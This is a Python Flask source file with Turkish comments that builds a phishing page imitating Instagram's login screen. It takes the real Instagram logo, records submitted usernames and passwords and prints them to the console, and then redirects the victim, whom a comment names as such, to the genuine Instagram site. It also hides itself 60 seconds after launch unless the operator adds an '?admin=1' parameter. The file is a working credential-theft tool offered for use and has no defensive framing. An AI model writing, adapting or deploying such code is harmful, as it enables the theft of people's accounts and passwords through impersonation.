import os, time
from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# Sitenin ilk açıldığı zamanı kaydeder
START_TIME = time.time()

HTML_TASARIM = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
        .logo { width: 175px; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; }
        button { width: 100%; padding: 7px; background-color: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-box">
        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo">
        <form method="POST" action="/login">
            <input type="text" name="u" placeholder="Kullanıcı adı" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    # 60 saniye kuralı: Eğer site açılalı 60 sn geçtiyse ve giren sen değilsen (admin şifresi yoksa)
    # Linkin sonuna ?admin=1 eklersen site sana hep açılır.
    elapsed = time.time() - START_TIME
    is_admin = request.args.get('admin') == '1'
    
    if elapsed > 60 and not is_admin:
        return redirect("https://www.instagram.com") # Kurbanı gerçek siteye atar
    
    return render_template_string(HTML_TASARIM)

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('u')
    pw = request.form.get('p')
    print(f"--- VERI GELDI --- Kullanici: {user} | Sifre: {pw}")
    return redirect("https://www.instagram.com/accounts/login/?source=auth_switcher")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
